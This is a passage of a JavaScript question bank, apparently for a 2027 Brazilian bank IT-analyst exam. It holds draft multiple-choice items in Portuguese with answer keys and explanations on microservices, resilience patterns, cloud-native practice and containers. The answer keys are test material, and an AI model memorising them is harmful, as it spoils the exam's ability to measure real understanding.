  "comentario": "**Gabarito: D.** São 5 tentativas × 2 s = 10 s de timeouts, mais as esperas 100 + 200 + 400 + 800 = 1.500 ms. Total = 11,5 s.\n\n(A) 8,0 s considera só 4 tentativas e nenhuma espera. (B) 9,5 s = 4 tentativas (8 s) + 1,5 s de espera, esquecendo a tentativa inicial. (C) 10,0 s ignora as esperas do backoff. (E) 13,1 s soma uma 5ª espera de 1,6 s que não ocorre, pois não há repetição depois da última tentativa.\n\nConta conferida em `tools/verificacao/agente4/verif_arq.py`.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V033",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Um circuit breaker abre após **3 falhas consecutivas**, permanece aberto por **10 s** e, depois disso, deixa passar **1 chamada de teste** (semiaberto): se ela tiver sucesso, o circuito fecha; se falhar, reabre por mais 10 s. O cliente faz uma requisição a cada 2 s, de t = 0 s a t = 30 s (16 requisições). O serviço remoto falha em todas as chamadas recebidas entre t = 4 s e t = 19 s e responde normalmente fora desse intervalo. O número de requisições efetivamente encaminhadas ao serviço e, entre elas, o número de falhas são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "16 e 8.",
    "B": "12 e 4.",
    "C": "8 e 4.",
    "D": "8 e 3.",
    "E": "10 e 5."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Simulação: t=0 e 2 sucesso; t=4, 6 e 8 falham → abre em t=8. t=10 a 16 bloqueadas. t=18 (10 s depois) é a chamada de teste e falha (o serviço ainda está fora) → reabre em t=18. t=20 a 26 bloqueadas. t=28 teste com sucesso → fecha; t=30 sucesso. Encaminhadas: 0, 2, 4, 6, 8, 18, 28, 30 = **8**; falhas: 4, 6, 8, 18 = **4**.\n\n(A) Seria o resultado sem circuit breaker (16 chamadas, 8 falhas de t=4 a t=18). (B) Considera que a chamada de teste em t=18 teria sucesso e que o circuito fecharia ali. (D) Esquece que a chamada de teste em t=18 também conta como falha. (E) Não corresponde a nenhuma sequência possível com as regras dadas.\n\nSimulação executada em `tools/verificacao/agente4/verif_arq.py`.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V034",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para concluir uma transferência, o aplicativo chama em sequência, de forma síncrona, três microsserviços cujas disponibilidades são 99,9%, 99,5% e 99,9%. Supondo falhas independentes e que a operação só tem sucesso se os três estiverem disponíveis, a disponibilidade da operação é de aproximadamente",
  "imagem": null,
  "alternativas": {
    "A": "99,90%.",
    "B": "99,77%.",
    "C": "99,50%.",
    "D": "99,30%.",
    "E": "98,30%."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Em série, multiplicam-se as disponibilidades: 0,999 × 0,995 × 0,999 ≈ 0,99301 → **≈ 99,30%**. Cadeias síncronas longas reduzem a disponibilidade, um argumento a favor de comunicação assíncrona e de padrões de resiliência.\n\n(A) Pega o maior valor. (B) É a média aritmética (≈ 99,77%), que não se aplica. (C) Pega o menor valor; a cadeia é sempre **pior** que o elo mais fraco. (E) Erro de conta (subtrai 1,7 ponto).\n\nConta conferida em `tools/verificacao/agente4/verif_arq.py`.\n\nRevisar: Apostila 06, §11.8.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V035",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.2",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma empresa dividiu seu sistema em 20 serviços, mas todos compartilham o mesmo banco de dados e precisam ser implantados juntos a cada release, porque qualquer mudança de esquema quebra os demais. Segundo a literatura de microsserviços, essa situação caracteriza",
  "imagem": null,
  "alternativas": {
    "A": "um monolito modular, recomendado por Fowler no caminho \"monolith first\".",
    "B": "uma arquitetura hexagonal com adaptadores secundários.",
    "C": "uma saga coreografada.",
    "D": "um service mesh mal configurado.",
    "E": "um monolito distribuído, que soma as desvantagens das duas abordagens."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Serviços tão acoplados que precisam ser implantados juntos formam um **monolito distribuído**: têm a complexidade de rede dos microsserviços sem a implantação independente.\n\n(A) O monolito modular é **uma** unidade de implantação bem modularizada, não 20 serviços acoplados. (B) Hexagonal trata do isolamento do domínio. (C) Saga é padrão de consistência de dados. (D) Service mesh cuida da comunicação; não causa acoplamento de esquema.\n\nRevisar: Apostila 06, §11.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V036",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.2",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "\"Organizações projetam sistemas que copiam suas estruturas de comunicação.\" Essa afirmação, usada para justificar times multifuncionais organizados por capacidade de negócio em microsserviços, é conhecida como",
  "imagem": null,
  "alternativas": {
    "A": "Lei de Conway.",
    "B": "Teorema CAP.",
    "C": "Lei de Moore.",
    "D": "Princípio de Pareto.",
    "E": "Lei de Brooks."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** A **Lei de Conway** relaciona a estrutura do sistema à estrutura de comunicação da organização; por isso se organizam times por domínio (Pagamentos, Crédito).\n\n(B) CAP trata de consistência, disponibilidade e partição em sistemas distribuídos. (C) Moore fala da densidade de transistores. (D) Pareto é a regra 80/20. (E) Brooks: acrescentar pessoas a um projeto atrasado o atrasa ainda mais.\n\nRevisar: Apostila 06, §11.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V037",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Durante uma partição de rede entre duas regiões, um sistema distribuído de saldo de pontos de fidelidade continua aceitando leituras e escritas nas duas regiões e reconcilia os dados depois que a comunicação volta. À luz do teorema CAP, o sistema",
  "imagem": null,
  "alternativas": {
    "A": "privilegia consistência forte em detrimento da disponibilidade.",
    "B": "privilegia disponibilidade, aceitando consistência eventual (modelo BASE).",
    "C": "elimina a possibilidade de partição de rede.",
    "D": "garante simultaneamente consistência forte, disponibilidade e tolerância a partição.",
    "E": "usa transações ACID globais entre as regiões."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** Com partição (P), é preciso escolher entre C e A. Continuar atendendo nas duas regiões e reconciliar depois é escolher **disponibilidade** com **consistência eventual** (BASE).\n\n(A) Privilegiar consistência implicaria recusar operações durante a partição. (C) Partições não podem ser eliminadas por projeto. (D) O teorema diz justamente que não se garantem as três durante a partição. (E) ACID global exigiria coordenação, impossível durante a partição sem perder disponibilidade.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V038",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para atender exigências de auditoria, o serviço de Carteira de Investimentos deixou de gravar apenas a posição atual do cliente e passou a armazenar, em ordem, todos os fatos ocorridos (aplicação feita, resgate feito, rendimento creditado). A posição atual é obtida reproduzindo esses fatos. Trata-se de",
  "imagem": null,
  "alternativas": {
    "A": "CQRS.",
    "B": "Event Sourcing.",
    "C": "API Composition.",
    "D": "Database per service.",
    "E": "Outbox transacional."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** No **Event Sourcing** guarda-se a **sequência de eventos** que levou ao estado, reconstruído pela reprodução dos eventos; dá trilha de auditoria completa.\n\n(A) CQRS separa os modelos de leitura e escrita (é comum combiná-lo com Event Sourcing, mas são padrões distintos). (C) API Composition junta resultados de vários serviços. (D) Database per service define a propriedade dos dados. (E) Outbox garante a publicação de eventos junto com a transação local.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V039",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre API Gateway e service mesh em uma plataforma de microsserviços, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "o service mesh substitui o API Gateway na exposição de APIs a parceiros externos, com portal de desenvolvedores e cobrança por uso.",
    "B": "o API Gateway exige alterar o código de cada serviço para implementar mTLS entre eles.",
    "C": "ambos são bibliotecas que devem ser importadas no código-fonte dos serviços.",
    "D": "o service mesh usa proxies sidecar para tratar a comunicação interna serviço a serviço (mTLS, retries, observabilidade), enquanto o API Gateway é a porta de entrada dos clientes externos.",
    "E": "o service mesh é um tipo de ESB centralizado com transformação XSLT."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** O **service mesh** (Istio, Linkerd) usa **proxies sidecar** e cuida do tráfego interno (leste-oeste) sem alterar o código; o **API Gateway** é o ponto único de entrada dos clientes externos (norte-sul).\n\n(A) Exposição externa e gestão de APIs são funções do gateway. (B) mTLS automático entre serviços é justamente o que o mesh oferece sem mudar código. (C) Ambos são componentes de infraestrutura, não bibliotecas. (E) O mesh não é barramento com transformação de mensagens.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V040",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, s…",
  "ref_apostila": {
    "modulo": "07",
    "secao": "2",
    "titulo": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#2. Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 07 §2.6",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Segundo a CNCF, aplicações nativas de nuvem (cloud native) caracterizam-se pelo uso de",
  "imagem": null,
  "alternativas": {
    "A": "servidores físicos dedicados, configurados manualmente e atualizados no lugar.",
    "B": "um único artefato monolítico implantado trimestralmente.",
    "C": "contêineres, microsserviços, service meshes, infraestrutura imutável e APIs declarativas.",
    "D": "sessões de usuário guardadas na memória local de cada instância.",
    "E": "configuração fixa no código-fonte, igual em todos os ambientes."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** A definição da CNCF cita **contêineres, service meshes, microsserviços, infraestrutura imutável e APIs declarativas**.\n\n(A) Servidores atualizados no lugar caracterizam infraestrutura mutável (\"flocos de neve\"). (B) Releases raros e monolíticos se opõem à entrega contínua. (D) Estado na memória local impede escalar horizontalmente (12 fatores: processos sem estado). (E) O fator III manda guardar configuração em variáveis de ambiente.\n\nRevisar: Apostila 07, §2.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V041",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, s…",
  "ref_apostila": {
    "modulo": "07",
    "secao": "2",
    "titulo": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#2. Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 07 §2.6",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma aplicação de internet banking guardava a sessão do usuário na memória do servidor de aplicação; ao escalar horizontalmente, os usuários eram desconectados quando o balanceador os mandava para outra instância. Pelo Twelve-Factor App, a correção alinhada ao fator \"Processos\" é",
  "imagem": null,
  "alternativas": {
    "A": "executar a aplicação como processos sem estado e guardar a sessão em um serviço de apoio, como um cache distribuído.",
    "B": "gravar a sessão em arquivo local de cada instância.",
    "C": "desativar o balanceador de carga.",
    "D": "aumentar a memória de cada instância (escala vertical).",
    "E": "fixar a configuração da sessão no código-fonte."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O fator **VI (Processos)** pede processos **sem estado**; dados que precisam persistir ficam em **serviços de apoio** (banco, cache como Redis).\n\n(B) Arquivo local continua preso à instância. (C) Sem balanceador não há escala horizontal. (D) Escala vertical não resolve a troca de instância. (E) Configuração no código viola o fator III.\n\nRevisar: Apostila 07, §2.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V042",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Padrões de projeto GoF, MVC e arquitetura em camadas",
  "ref_apostila": {
    "modulo": "06",
    "secao": "9",
    "titulo": "Padrões de projeto GoF, MVC e arquitetura em camadas",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#9. Padrões de projeto GoF, MVC e arquitetura em camadas]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §9.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um sistema de conciliação bancária recebe um arquivo de retorno e o faz passar por uma sequência de etapas independentes — validar layout, converter formato, enriquecer com dados do cliente, gravar —, em que a saída de cada etapa é a entrada da seguinte. Esse estilo arquitetural é o",
  "imagem": null,
  "alternativas": {
    "A": "repositório (dados compartilhados).",
    "B": "cliente-servidor.",
    "C": "MVC.",
    "D": "orientado a eventos com publish/subscribe.",
    "E": "duto e filtro (pipes and filters)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Em **duto e filtro**, os dados fluem por uma sequência de transformações independentes (pipelines Unix, compiladores, ETL).\n\n(A) No repositório os componentes interagem por um armazenamento central. (B) Cliente-servidor separa quem oferece e quem consome serviços. (D) Em eventos, componentes reagem a eventos publicados, sem cadeia fixa. (C) MVC organiza interfaces interativas.\n\nRevisar: Apostila 06, §9.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V043",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Com dezenas de microsserviços evoluindo de forma independente, uma equipe passou a verificar, em cada pipeline, se o provedor de uma API ainda atende às expectativas registradas pelos seus consumidores, sem precisar subir o ambiente completo. Essa prática corresponde a",
  "imagem": null,
  "alternativas": {
    "A": "testes de carga com JMeter.",
    "B": "testes de contrato orientados ao consumidor (por exemplo, com Pact).",
    "C": "testes ponta a ponta em produção.",
    "D": "análise estática de segurança (SAST).",
    "E": "testes de mutação."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** **Testes de contrato** (Pact) verificam se provedor e consumidor continuam compatíveis, sem ambiente integrado completo — recomendados para microsserviços.\n\n(A) Teste de carga mede desempenho. (C) Ponta a ponta exige o sistema todo e é justamente o que se quer reduzir. (D) SAST procura vulnerabilidades no código. (E) Teste de mutação avalia a qualidade dos testes alterando o código.\n\nRevisar: Apostila 06, §11.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V044",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA…",
  "ref_apostila": {
    "modulo": "06",
    "secao": "18",
    "titulo": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#18. Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §18.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco quer que novos canais digitais consultem saldos mantidos por programas COBOL em mainframe, sem reescrever o legado neste momento e sem que os canais conheçam os detalhes do mainframe. Entre os padrões de integração legado-moderno, a solução mais direta é",
  "imagem": null,
  "alternativas": {
    "A": "reescrever todo o core bancário em microsserviços antes de liberar os canais.",
    "B": "dar aos canais acesso direto às tabelas do banco de dados do mainframe.",
    "C": "exportar diariamente arquivos texto para cada canal.",
    "D": "expor as funções do mainframe por APIs REST de fachada, publicadas no API Gateway.",
    "E": "migrar o mainframe por rehost para máquinas virtuais em nuvem."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** **APIs de fachada** expõem funções do mainframe por REST, escondendo os detalhes do legado; publicadas no gateway, ganham autenticação e rate limiting.\n\n(A) Reescrever tudo antes é a abordagem big bang, de alto risco. (B) Acesso direto às tabelas cria acoplamento e ignora as regras do legado. (C) Arquivos diários não atendem consulta em tempo real. (E) Rehost muda a hospedagem, não oferece interface aos canais.\n\nRevisar: Apostila 06, §18.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V045",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §11.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma requisição de abertura de conta passa por oito microsserviços e está lenta. Para identificar em qual serviço e em qual chamada o tempo está sendo gasto, a técnica mais adequada é",
  "imagem": null,
  "alternativas": {
    "A": "o rastreamento distribuído (distributed tracing), propagando um identificador de correlação entre os serviços.",
    "B": "a análise do log local de apenas um dos serviços.",
    "C": "o aumento do timeout de todas as chamadas.",
    "D": "a substituição do API Gateway por um balanceador L4.",
    "E": "a geração de um dump de memória do banco de dados."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **rastreamento distribuído** (OpenTelemetry, Jaeger, Zipkin) segue a requisição por todos os serviços, mostrando o tempo de cada trecho (spans), com ID de correlação propagado.\n\n(B) O log de um só serviço não mostra o caminho completo. (C) Aumentar timeout esconde o problema. (D) Trocar o gateway não dá visibilidade. (E) Dump do banco não mostra a cadeia de chamadas.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V001",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Virtualização e contêineres",
  "ref_apostila": {
    "modulo": "04",
    "secao": "13",
    "titulo": "Virtualização e contêineres",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#13. Virtualização e contêineres]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §13 – Q2",
    "id_pai": "ESP-DEVOPS-0001",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Comparando máquinas virtuais e contêineres, é INCORRETO afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "a máquina virtual virtualiza o hardware e executa um sistema operacional convidado completo, com kernel próprio.",
    "B": "o contêiner virtualiza o sistema operacional e compartilha o kernel do hospedeiro.",
    "C": "contêineres costumam iniciar em segundos e permitem maior densidade de instâncias por host.",
    "D": "por compartilharem o kernel, contêineres oferecem isolamento mais forte que o das máquinas virtuais.",
    "E": "é comum, na nuvem, executar contêineres dentro de máquinas virtuais."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** O kernel compartilhado torna o isolamento do contêiner **mais fraco**: uma falha no kernel afeta todos os contêineres do host. A VM tem fronteira de hardware virtual e isolamento mais forte.\n\n(A), (B), (C) e (E) estão corretas: VM virtualiza hardware com SO completo; contêiner virtualiza o SO; contêineres são leves e densos; e VMs e contêineres se complementam.\n\nRevisar: Apostila 04, §13.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V002",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Virtualização e contêineres",
  "ref_apostila": {
    "modulo": "04",
    "secao": "13",
    "titulo": "Virtualização e contêineres",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#13. Virtualização e contêineres]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §13 – Q2",
    "id_pai": "ESP-DEVOPS-0001",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma equipe mantém servidores físicos com Linux e precisa executar, nesses mesmos servidores, uma aplicação legada que só roda em Windows Server, com isolamento forte em relação às demais cargas. A solução tecnicamente adequada é",
  "imagem": null,
  "alternativas": {
    "A": "executar a aplicação em um contêiner Docker Linux, que traduz as chamadas do Windows.",
    "B": "usar apenas namespaces e cgroups do kernel Linux.",
    "C": "usar um chroot com as bibliotecas do Windows.",
    "D": "criar uma máquina virtual com Windows Server sobre um hipervisor.",
    "E": "converter a aplicação em um pod Kubernetes sem alterar o sistema operacional exigido."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Como o contêiner compartilha o kernel do hospedeiro, um contêiner precisa ser compatível com esse kernel. Para rodar Windows num host Linux, com isolamento forte, usa-se uma **máquina virtual** sobre hipervisor.\n\n(A) Contêiner Linux não executa binários Windows. (B) Namespaces e cgroups isolam e limitam processos Linux, não emulam outro SO. (C) chroot só muda a raiz do sistema de arquivos. (E) Um pod também roda contêineres sobre o kernel do nó; não resolve a incompatibilidade de SO.\n\nRevisar: Apostila 04, §13.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V003",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Virtualização e contêineres",
  "ref_apostila": {
    "modulo": "04",
    "secao": "13",
    "titulo": "Virtualização e contêineres",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#13. Virtualização e contêineres]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §13 – Q4",
    "id_pai": "ESP-DEVOPS-0002",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No Linux, o recurso do kernel que faz com que cada contêiner tenha suas próprias interfaces de rede, tabela de rotas e portas, sem enxergar as dos demais, é o",
  "imagem": null,
  "alternativas": {
    "A": "cgroup de memória.",
